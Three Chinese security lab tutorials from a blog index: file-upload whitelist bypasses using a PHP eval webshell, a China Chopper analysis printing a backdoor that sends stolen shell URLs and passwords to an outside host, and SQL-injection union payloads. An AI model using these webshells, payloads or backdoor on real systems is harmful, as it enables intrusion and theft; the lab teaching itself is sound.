<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>绕过白名单检查实现文件上传</title>
    <url>/2020/08/14/shangchuan/</url>
    <content><![CDATA[<ol>
<li><h5 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h5><p>通常web站点会有用户注册功能，而当用户登录之后大多数情况下会存在类似头像上传、附件上传之类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，导致攻击者通过各种手段绕过验证，上传非法文件，这是在web渗透中非常关键的突破口。<a id="more"></a></p>
</li>
<li><p>文件上传漏洞危害</p>
<p>攻击者绕过上传验证机制上传恶意文件，通过上传的web后门获得整个web业务的控制权，复杂一点的情况是结合web服务器的解析漏洞来获取权限。</p>
</li>
</ol>
<p>\3.  文件上传检测流程</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/4d222065-5fdb-4951-a3bd-8bd913f15347.png" alt="img"></p>
<p>   通常一个文件以HTTP协议进行上传时，将以POST请求发送至web服务器，web服务器收到请求并同意后，用户与web服务器将建立连接，并传输数据。</p>
<p>\4.  常见的MIME类型</p>
<p>   1）超文本标记语言.html文件的MIME类型为：text/html</p>
<p>   2）普通文本.txt文件的MIME类型为：text/plain</p>
<p>   3）PDF文档.pdf的MIME类型为：application/pdf</p>
<p>   4）MicrosoftWord文件.word的MIME类型为：application/msword</p>
<p>   5）PNG图像.png的MIME类型为：image/png</p>
<p>   6）GIF图像.gif的MIME类型为：image/gif</p>
<p>   7）MPEG文件.mpg、.mpeg的MIME类型为：video/mpeg</p>
<p>   8）AVI文件.avi的MIME类型为：video/x-msvideo</p>
<p>\5.  00截断</p>
<p>   1） 0x00截断</p>
<p>​    0x00是十六进制表示方法，表示ASCII码为0的字符，在一些函数处理时，会把这个字符当作结束符。</p>
<p>​     0x00可以用在对文件名的绕过上，具体原理：系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但要注意是文件的十六进制内容里的00，而不是文件名中的00。也就是说系统是按二进制或十六进制读取文件，遇到ASCII码为0的位置就停止，而这个ASCII码为0的位置在十六进制中是00。</p>
<p>   总之就是利用ASCII码为0这个特殊字符，让系统认为字符串已经结束。</p>
<p>   2） %00截断</p>
<p>​     url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是%00字符，而是%00解码后的内容，即解码成了0x00。总之就是%00被服务器解码为0x00发挥了截断作用。</p>
<p>   3） 0x0a</p>
<p>​    0x0a是十六进制表示方法，表示ASCII码为/n的换行字符，具体为换行至下一行行首起始位置。</p>
<p>实验目的</p>
<p>通过该实验了解文件上传漏洞的基础知识及如何绕过白名单检测上传恶意文件。</p>
<p>实验环境</p>
<p>操作系统：</p>
<p>Windows10：部署文件上传漏洞环境及漏洞利用；ip：10.1.1.100</p>
<p>辅助工具：phpStudy、Mozilla Firefox、burpsuite、菜刀</p>
<p>源码与工具请在实验机内下载使用：<a href="http://tools.hetianlab.com/tools/T044.zip%EF%BC%88%E5%8C%85%E9%87%8C%E6%9C%89%E8%8F%9C%E5%88%80%EF%BC%8C%E4%B8%BA%E9%81%BF%E5%85%8D%E8%AF%AF%E6%9D%80%E4%B8%8B%E8%BD%BD%E4%B9%8B%E5%89%8D%E5%85%88%E5%85%B3%E9%97%ADdefender%EF%BC%89">http://tools.hetianlab.com/tools/T044.zip（包里有菜刀，为避免误杀下载之前先关闭defender）</a>  </p>
<p>关闭defender步骤：在桌面搜索栏搜关键字 defender-&gt; 设置-&gt; 实时保护（关闭）即可</p>
<p><img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/451c9ed8-e93f-486d-be90-da7042931d6a.png" alt="img"></p>
<p><strong>本次实验采用github开源项目upload-labs靶场，项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></strong></p>
<p>实验步骤一</p>
<p><strong>任务描述：通过修改MIME类型，使其符合$_FILES[‘upload_file’][‘type’]的白名单，达到上传恶意文件的目的。</strong></p>
<p>\1.  Windows机器上下载的源码文件放到phpStudy的WWW目录下，在源码文件里创建一个名为upload的文件夹：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/a37bb32c-b83a-422f-a91e-0267c269f359.png" alt="img"></p>
<p>   PHP版本切换至5.2.17，开启phpStudy；</p>
<p>\2.  在桌面写一个简单的一句话木马eval.php：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/5133f5fb-02a7-4d15-b58c-7533b588094c.png" alt="img"></p>
<p>\3.  浏览器访问<a href="http://10.1.1.100/upload-labs/index.php%EF%BC%8C%E9%80%89%E6%8B%A9Pass-02%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%98%AF%E7%99%BD%E5%90%8D%E5%8D%95%E5%88%A4%E6%96%AD%EF%BC%8C%E5%8F%AA%E5%85%81%E8%AE%B8%E4%B8%8A%E4%BC%A0$_FILES[&#39;upload_file&#39;][&#39;type&#39;]%E4%B8%BA&#39;image/jpeg&#39;%E3%80%81&#39;image/png&#39;%E5%8F%8A&#39;image/gif&#39;%E7%9A%84%E6%96%87%E4%BB%B6%E3%80%82">http://10.1.1.100/upload-labs/index.php，选择Pass-02，查看源码可以发现是白名单判断，只允许上传$_FILES[&#39;upload_file&#39;][&#39;type&#39;]为&#39;image/jpeg&#39;、&#39;image/png&#39;及&#39;image/gif&#39;的文件。</a></p>
<p>\4.  上传eval.php并用burpsuite抓包：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/c81881d8-89cf-4209-9634-6013f77130d2.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/dea2539e-f14b-475c-b7c7-98ccf1c7afa0.png" alt="img"></p>
<p>   此时的MIME类型为application/octet-stream</p>
<p>\5.  修改Content-Type为image/gif，点击‘go’之后在Response处查看响应内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/663ae87d-d503-4e65-b7a1-0f4a781db7c8.png" alt="img"></p>
<p>   成功上传木马文件到upload文件夹。</p>
<p>实验步骤二</p>
<p><strong>任务描述：$img_path直接拼接，利用%00截断进行绕过，上传恶意文件并通过浏览器连接webshell。</strong></p>
<p>\1.  选择Pass-11，点击右上方‘显示源码’，根据源码提示进行文件上传：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/b5ee242f-40ab-4e3e-80cb-4ca27d0ff3f9.png" alt="img"></p>
<p>​    <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/89b9ae08-07bf-4360-a39a-f10ae8e21625.png" alt="img"></p>
<p>   可以看到是白名单判断，但是$img_path直接对上传的文件名拼接，使用$_GET传参，我们可以利用%00截断进行绕过。</p>
<p>   注：%00截断的条件：</p>
<p>   1）PHP版本小于5.3.4；</p>
<p>   2）打开PHP的配置文件php-ini，将magic_quotes_gpc设置为Off。</p>
<p>\2.  桌面写一个test.jpg文件：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/ce1228ad-ccfc-4804-96ce-286896468f8e.png" alt="img"></p>
<p>\3. Windows中修改PHP配置文件php.ini：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/9de38a44-ce9d-4f9f-ad7d-d4c2a9e16c13.png" alt="img"></p>
<p>   保存后重启phpStudy。</p>
<p>\4.  上传test.jpg并使用burpsuite抓包，save_path改为../upload/test.php%00：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/bbb172d2-ff74-4691-bd53-aab134ec80b0.png" alt="img"></p>
<p>\5.  点击‘go’之后查看响应内容，最后保存下来的文件会是test.php：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/00045a1c-83e0-4b05-9c6f-7d460f0c3492.png" alt="img"></p>
<p>\6.  Firefox浏览器连接webshell：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/964eb435-9b1d-44c4-a389-8cee1aa5eecd.png" alt="img"></p>
<p>   连接成功。</p>
<p>实验步骤三</p>
<p><strong>任务描述：0x00截断绕过，利用burpsuite的hex功能将save_path改成../upload/test.php[二进制00]形式，上传恶意文件并通过菜刀浏览器连接webshell。</strong></p>
<p>\1.  选择Pass-12，通过源码提示进行文件上传：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/07ea1c32-cf96-42e9-93e0-972d67d957a4.png" alt="img"></p>
<p>   和Pass-11不同的是，’save_path’是通过post传进来的，需要在二进制文件中进行修改，因为post不会像get那样对%00进行自动解码。</p>
<p>\2.  上传test.jpg并使用burpsuite抓包，利用burpsuite的hex功能将save_path改成../upload/test.php[二进制00]形式：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/f45c28b0-8383-4aa3-aa4c-4f1d0f759491.png" alt="img"></p>
<p>   在../upload/后添加test.php （.php后面加空格），filename不用修改，然后点击‘Hex’：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/36b929f2-102c-43c1-ae2f-82c9e293dd56.png" alt="img"></p>
<p>   预备知识里说到了0x0a是十六进制表示方法，表示ASCII码为/n的换行字符，具体为换行至下一行行首起始位置；而0x0d表示ASCII码为/r的回车字符，回车的作用只是移动光标至该行的起始位置。</p>
<p>\3.  将0d前面的20改为00，然后点击‘go’查看响应内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/74f09467-df5b-4879-a335-6d0567f54634.png" alt="img"></p>
<p>   最终上传的是test.php文件。</p>
<p>\4.  使用菜刀连接webshell：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/47236e2f-b8d0-4e57-80a6-5cd7b6ea0f9c.png" alt="img"></p>
<p>   点这个‘+’号；</p>
<p>   输入webshell地址<a href="http://10.1.1.100/upload-labs/upload/test.php%EF%BC%9A">http://10.1.1.100/upload-labs/upload/test.php：</a></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/978b22f4-4cba-4328-a3a2-c28fc621be60.png" alt="img"></p>
<p>   在后面的post数据输入框里输入：test=phpinfo();</p>
<p>​    <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/c213f924-8e66-4222-8b3d-1890a023747a.png" alt="img"></p>
<p>   点击post数据输入框后面的提交键，即可连接webshell：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/f3509f4b-d330-4e20-bddf-6ee9f4d7b3fc.png" alt="img"></p>
<p>实验步骤四</p>
<p><strong>任务描述：本关考察CVE-2015-2348，move_uploaded_file() 00截断，上传webshell同时自定义保存名称，上传成功后用菜刀连接。</strong></p>
<p>\1.  选择Pass-19，点击右上方‘显示源码’，根据源码提示进行文件上传：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/e812e031-453e-4189-8513-1850b0afa61f.png" alt="img"></p>
<p>   发现move_uploaded_file()函数中的$img_path是由post参数save_name控制的，可以在save_name中利用00截断进行绕过。</p>
<p>\2.  上传test.jpg并使用burpsuite抓包：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/14128cea-8412-48e1-8c5f-adab6d363a2a.png" alt="img"></p>
<p>   保存名称修改为‘test.php+空格.1.jpg’，点击‘上传’；</p>
<p>\3.  在‘Hex’中将20（表示php后的那个空格）改为00，然后点击‘go’查看响应内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/30784e7e-ef71-40cb-861e-e8ded6c83965.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/ed3575c5-8324-4146-b392-cd207bba63ec.png" alt="img"></p>
<p>   最终上传的是test.php文件。</p>
<p>\4.  通过菜刀连接webshell：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/51a8809e-9004-4f50-8650-c00486139816.png" alt="img"></p>
<p>   此处的‘test’即为@eval($_POST[‘test’]);中的‘test’，脚本类型选择‘PHP’，点击‘添加’：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/cca35cc1-b785-4968-9995-403069c7c192.png" alt="img"></p>
<p>   菜刀连接webshell成功。</p>
<p>漏洞修复</p>
<p>\1. 将上传的目录设置为不可执行；</p>
<p>\2. 判断文件类型：结合MIME Type、后缀检查等方式，推荐文件类型检查使用白名单的方式；</p>
<p>\3. 使用随机数改写文件名和文件路径。</p>
<p>实验报告要求</p>
<p>参考实验原理与相关介绍，完成实验任务，并对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<p>分析与思考</p>
<p>1）文件上传漏洞在实际环境中如何利用？</p>
<p>2）文件上传漏洞还有哪些绕过姿势？</p>
]]></content>
  </entry>
  <entry>
    <title>全面分析中国菜刀及隐藏后门</title>
    <url>/2020/08/14/caidao/</url>
    <content><![CDATA[<p><strong>中国菜刀</strong></p>
<p> 中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示</p>
<a id="more"></a>

<p><strong>winsock expert</strong></p>
<p> 一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据</p>
<p><strong>UPX</strong></p>
<p>   UPX (the Ultimate Packer for eXecutables)是一款先进的可执行程序文件压缩器，压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失和压缩之前一样可正常地运行，对于支持的大多数格式没有运行时间或内存的不利后果。</p>
<p><strong>Wireshark</strong></p>
<p>   Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p>
<p><strong>PEID</strong></p>
<p>   一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p>
<p>实验目的</p>
<p>通过该实验了解中国菜刀的特性及其通信原理、机制，并且学会分析可能隐藏的后门以及其工作原理。</p>
<p>实验环境</p>
<p> <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/d54704cf-2bc1-4d85-b621-2c13742ac017.jpg" alt="img"></p>
<p>服务器：两台WIN 7  IP地址：随机</p>
<p>辅助工具：peid,wireshark,strings,upx,wireshark,winsock expert,burpsuite</p>
<p>工具下载链接：<a href="http://tools.hetianlab.com/tools/T001.zip">http://tools.hetianlab.com/tools/T001.zip</a></p>
<p>实验步骤一</p>
<p><strong>任务描述：“静态”分析中国菜刀</strong></p>
<p>   作为一款黑客神器，怎么可能裸奔呢？</p>
<p>   我们通过peid等工具可以看出来加壳了</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/c426938c-4f5f-43e3-9482-bb082441daf0.png" alt="img"></p>
<p>   通过winhex，也可以看到菜刀经过upx加壳处理</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/96400245-c975-4307-9a22-96c7c31bc159.png" alt="img"></p>
<p>   我们相应地对它脱壳处理</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/1be139d4-b327-4bac-9716-442735d1064f.png" alt="img"></p>
<p>   这时候再用peid查看，可以看到已经没有壳了，并且可以看出是vc++6.0编写</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/f9e9360c-e11f-4170-b6fe-b71e9f439f48.png" alt="img"></p>
<p>   既然已经脱壳了，那我们来把它的可见字符串打印出来看看</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/12ce8834-77ac-4b3b-8161-3d0d5008d1a5.png" alt="img"></p>
<p>   由于字符串太多，我们可以有目的性地查找字符串如http</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/23d3afa9-296c-48bc-b3f2-dcce8885b932.png" alt="img"></p>
<p>   再比如说关键字chopper</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=GBee9320adea6e062018012616595200001/c172ba73-b083-49b8-8655-49cea23e6a72.png" alt="img"></p>
<p>实验步骤二</p>
<p><strong>任务描述：动态分析中国菜刀</strong></p>
<p>  注：我们在下载包中提供了实验所需的<strong>所有</strong>软件，并提供了编写实验时的抓包数据2017.pcapng，实验者可根据数据包分析也可用提供的phpstudy搭建网站自行抓包体验过程。</p>
<p>   在靶机上写一个php一句话放在网站的根目录下，如1.php,内容为</p>
   <?php @eval($_POST['chopper']);?>

<p>   然后在攻击机打开wireshark准备监听数据包，同时使用菜刀进行连接</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/783c8f77-317c-4265-b76f-5bde61412b9f.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/e973247e-3ab3-4548-9997-d2055a070c48.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/bc12978d-b1bc-47e1-8de6-2e8f433a3040.png" alt="img"></p>
<p> 监听到的数据包如下：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/59c56685-a94f-4651-8a7a-7c3022d683f5.png" alt="img"></p>
<p>   客户端在80端口上，以HTTP POST方式通讯</p>
<p>   我们可以追踪tcp流来查看整个tcp数据交互过程</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/2782f8e6-9cdc-4885-b2b9-9d130dd6c6f4.png" alt="img"></p>
<p>   上面红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果</p>
<p>   我们可以看到一共有z0,z1,z2三个参数，我们分别解码。</p>
<p>   解码的顺序依次为url解码，然后再base64解码，得到明文</p>
<p>   可以看到红色部分的代码经过base64以及url的编码，我们解码看看</p>
<p>   考虑到环境没有联网，我们可以使用burp的解码模块</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/3528cb21-26d1-4519-89f5-2a751fd59d89.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7a66114c-9ae9-4c53-9562-f1b8920b84ac.png" alt="img"></p>
<p>   明文如下：</p>
<p>​    z0=@ini_set(“display_errors”,”0”)@set_time_limit(0)@set_magic_quotes_runtime(0)echo(“-&gt;|”);;$p=base64_decode($_POST[“z1”]);$s=base64_decode($_POST[“z2”]);$d=dirname($_SERVER[“SCRIPT_FILENAME”]);$c=substr($d,0,1)==”/“?”-c ‘{$s}’”:”/c {$s}”;$r=”{$p} {$c}”;@system($r.” 2&gt;&amp;1”);;echo(“|&lt;-“);die();</p>
<p>   z1=cmd</p>
<p>   z2=cd /d “D:\phpstudy\PHPTutorial\WWW&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</p>
<p>   z1的值是cmd，z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/3c71290d-ecf4-4b2a-a5fe-4502971cdd54.png" alt="img"></p>
<p>   我们输入其他的命令的话，当然也是可以通过同样的流程进行分析</p>
<p>   以上就是中国菜刀的流量通信的特征</p>
<p>   了解了正常的菜刀是如何工作的，接下来我们看看被植入恶意后门的菜刀是怎样的。</p>
<p>实验步骤三</p>
<p><strong>任务描述：分析中国菜刀后门</strong></p>
<p>   为了与步骤2中的正常菜刀的分析流程进行区分，我们这一步特地选用了另外一个菜刀（带有隐藏后门的菜刀，在文件夹“步骤3”中），并且使用另外一个抓包软件进行分析（也在文件夹“步骤3”中）。<br>   打开菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/137626e7-3409-4a43-85c5-16340fae57d0.png" alt="img"></p>
<p>   接下来连接菜刀</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/b9254451-8d4b-490e-bd22-3795ebef4757.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/c1b528a5-14fa-4643-8920-d8e98a93aa1c.png" alt="img"></p>
<p>   菜刀连接以后我们可以随意操作一下（比如点击、切换文件夹等，以此来产生通信流量方便我们后续的分析）</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7a56f229-d473-4f68-92bb-bdf895500811.png" alt="img"></p>
<p>   回到我们的winsock expert</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/42ca33d8-b8c1-4af5-828a-424ad470dc5c.png" alt="img"></p>
<p>   我们将下面的字符串解码</p>
<p>   先URL解码</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/29a0c8da-6682-464f-a277-1883927f18f0.png" alt="img"></p>
<p>   再base64解码</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/ea21e876-9bf7-425f-9c9d-ba551423f918.png" alt="img"></p>
<p>   我们知道，在分析前一个菜刀时，一次URL解码，一次base64解码就可以了，但是，在分析这个菜刀的时候我们注意到，还是存在密文。</p>
<p>   那么我们接着解码</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/64e5ecc7-ca1f-41a7-8d97-3c0a56a5ab5a.png" alt="img"></p>
<p>   明文是这样的：</p>
<p>   if($_COOKIE[‘Lyke’]!=1){setcookie(‘Lyke’,1);@file(‘<a href="http://www.7jyewu.cn/hack.php?Url=&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;].&#39;&amp;Pass=&#39;.key($_POST));}">http://www.7jyewu.cn/hack.php?Url=&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;].&#39;&amp;Pass=&#39;.key($_POST));}</a></p>
<p>   这里的<a href="http://www.7jyewu.cn/hack.php%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B8%AA%E8%8F%9C%E5%88%80%E7%9A%84%E5%90%8E%E9%97%A8%E5%9C%B0%E5%9D%80%E3%80%82">http://www.7jyewu.cn/hack.php就是这个菜刀的后门地址。</a></p>
<p>   HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码</p>
<p>   这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p>
<p>   这样，我们就分析出了这个菜刀是存在后门的。</p>
<p>实验报告要求</p>
<p>参考实验原理与相关介绍，完成实验任务，并对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<p>分析与思考</p>
<p>1）总计本实验用到的分析软件的方法</p>
<p>2）思考针对有后门的软件我们该如何处理</p>
]]></content>
  </entry>
  <entry>
    <title>sql注入分享小结</title>
    <url>/2020/08/08/sql/</url>
    <content><![CDATA[<h2 id="0x00-SQL注入是什么？"><a href="#0x00-SQL注入是什么？" class="headerlink" title="0x00 SQL注入是什么？"></a>0x00 SQL注入是什么？</h2><p>SQL注入通过输入一些恶意的sql语句来修改后台数据库操作语句，执行注入语句已达到对数据库的增删改查（CRUD），甚至于数据库提权等。所以很多书籍或者机构的课程都会花较大篇幅去讲解SQL注入模块，学习SQL注入原理有利于后期的sqlmap以及waf绕过的学习。</p>
<a id="more"></a>

<h2 id="0x01-SQL注入的危害？"><a href="#0x01-SQL注入的危害？" class="headerlink" title="0x01 SQL注入的危害？"></a>0x01 SQL注入的危害？</h2><p>猜解后台数据库 ==》 这是利用最多的方式，通过猜解数据库，可盗取网站的敏感信息。</p>
<p>绕过验证      ==》 绕过验证登录网站后台</p>
<p>后台登陆语句：SELECT * FROM admin WHERE Username=’user’ and Password=’pass’</p>
<p>万能密码：’ or ‘1’=’1’ #</p>
<p>数据库提权    ==》注入可借助数据库的存储过程进行提权等操作</p>
<p>植马(即传入木马)，dos（造成拒绝服务攻击）</p>
<h2 id="0x02-SQL注入的基本流程"><a href="#0x02-SQL注入的基本流程" class="headerlink" title="0x02 SQL注入的基本流程"></a>0x02 SQL注入的基本流程</h2><blockquote>
<p>判断是否存在注入并判断是字符型还是数字型注入</p>
<p>判断查询列数，回显位置</p>
<p>获取数据库信息</p>
<p>破解加密数据</p>
<p>提升权限</p>
<p>内网渗透</p>
</blockquote>
<h2 id="0x03-SQL注入的分类"><a href="#0x03-SQL注入的分类" class="headerlink" title="0x03 SQL注入的分类"></a>0x03 SQL注入的分类</h2><h3 id="根据注入变量类型分类："><a href="#根据注入变量类型分类：" class="headerlink" title="根据注入变量类型分类："></a>根据注入变量类型分类：</h3><ul>
<li>数字型  ==》  <a href="http://127.0.0.1/sqli/Less-2/?id=1">http://127.0.0.1/sqli/Less-2/?id=1</a> and 1=2 –+</li>
<li>字符型  ==》  <a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> #   也可以 ?id=1’ and ‘1’=‘1 来闭合</li>
</ul>
<h3 id="根据注入请求方式分类："><a href="#根据注入请求方式分类：" class="headerlink" title="根据注入请求方式分类："></a>根据注入请求方式分类：</h3><ul>
<li>Get  方式  ==》 使用hackbar修改url，进行sql注入</li>
<li>POST 方式  ==》 可通过burpsuite抓包，修改post的数据进行传值的修改和sql注入</li>
</ul>
<h3 id="根据注入方式分类："><a href="#根据注入方式分类：" class="headerlink" title="根据注入方式分类："></a>根据注入方式分类：</h3><ul>
<li>联合查询注入 ==》 union操作符用于合并两个或多个select语句的结果集</li>
<li>报错型注入   ==》 即页面不会回显注入数据，只能通过页面报错来判断语句的正确与否</li>
<li>堆查询注入   ==》</li>
<li>盲注        ==》 盲注既不能看到数据的回显，也没有报错</li>
</ul>
<p>​      1.布尔盲注 通过sql的函数来逐个读取字符串，通过页面是否正常显示来判断猜解内容是否正确</p>
<p>​      2.时间盲注 通过sleep函数来判断猜解内容是否正确（sleep()内的数值建议设置在5-10s） </p>
<h3 id="根据编码问题："><a href="#根据编码问题：" class="headerlink" title="根据编码问题："></a>根据编码问题：</h3><ul>
<li>宽字节注入 ==》 由于网站会设置一些对用户输入内容的转义，通过编码，能够使我们注入语句中的单引号等符号得到正确显示  </li>
</ul>
<h2 id="0x04-Union联合查询"><a href="#0x04-Union联合查询" class="headerlink" title="0x04 Union联合查询"></a>0x04 Union联合查询</h2><p>UNION操作符用于合并两个或多个select语句的结果集，注意：UNION内部的SELECT语句前后必须有相同数量的列，列也必须有相似的数据类型，同时每条SELECT语句中的列的顺序必须相同。</p>
<p>SQL UNION 语法：</p>
<p>SELECT column_name FROM tables1 UNION SELECT column_name FROM tables2</p>
<p>注释：默认的，UNION操作符选取不同的值，如果允许重复，请使用UNION ALL</p>
<p>以sql-labs-master靶场第一关为例：</p>
<p>\1.判断是否有注入点，并判断其符号</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> ==》id=1’ id=1” id=1) 等</p>
<p>\2.判断其列数并定位可显示数据的位置</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> order by 3 –+  ==&gt;采用而二分法确定列数</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,3 –+ ==》定位可显示数据的列</p>
<p>\3.查看当前数据库（若第二、三列可回显）</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(schema_name) from information_schema.schemata  –+ ==&gt;查看当前所有数据库</p>
<p>\4.查看当前数据库的数据表(当前在security数据库)</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+ ==&gt;获取security内的所有表</p>
<p>\5. 查看所包含的列的信息（当前在users表）</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+ ==》获取users表的所有字段</p>
<p>数据库中有很多users表，但我们要查出当前security的users表</p>
<p>\6. 获取字段中关键信息（在users表查询并连接信息）</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(password,”_”,username) from users–+</p>
